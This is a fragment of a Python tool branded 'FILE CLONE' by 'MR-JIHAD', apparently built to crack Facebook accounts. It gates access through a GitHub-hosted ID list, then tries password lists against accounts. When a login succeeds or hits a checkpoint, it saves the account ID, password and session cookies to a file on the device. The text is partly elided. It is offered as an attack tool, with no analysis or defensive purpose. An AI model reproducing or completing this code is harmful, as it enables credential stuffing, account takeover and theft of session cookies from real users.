...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║       [ FILE CLONE VERSION 3.1.7 ]        ║                        ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
╠══[Author                   • MR-JIHAD ]     ║
╠══[Facebook                 • Refresh Jihad ]   ║
╠══[Github                   • J1H4D-2-0 ]   ║
╠══[Whatsapp                 • +601151104704 ]  ║
╠══[TOOLS                    • FILE CLONE] ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝)
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/J1H4D-2-0/Random-clone/blob/main/JID-2.txt').text
    if id in httpCaht:
      print(fuckyoursali)
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
              #  os.system('espeak -a 300 " ARAFAT,  Ok,  id"')
                open('/sdcard/JIHAD M3-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
